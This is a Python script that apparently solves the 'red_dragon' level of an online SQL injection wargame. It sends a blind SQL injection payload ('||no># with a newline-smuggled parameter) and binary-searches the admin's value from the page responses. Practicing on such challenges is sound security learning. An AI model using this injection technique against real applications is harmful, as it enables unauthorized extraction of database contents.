import requests
import os

URL_ID=os.environ['URL_ID']
PHPSESSID=os.environ['PHPSESSID']

url = f"https://los.rubiya.kr/chall/red_dragon_{URL_ID}.php"
cookie = {'PHPSESSID': PHPSESSID}

ans = 0
min_no = 0
max_no = 999999999999999999999999
while min_no + 1 != max_no:
    target = (min_no + max_no) // 2
    res = requests.get(url, params={'id': "'||no>#", "no": f'\n{target}'},cookies=cookie)
    
    if 'Hello admin' in res.text:
        min_no = target
        ans = min_no
        print(f"(in progress)ans: '{ans}'")
    else:
        max_no = target
ans += 1
res = requests.get(url, params={'id': 'admin', 'no': ans},cookies=cookie)
if res.text.find("Clear") > 0:
    print("Clear!")
else:
    print("Failed")
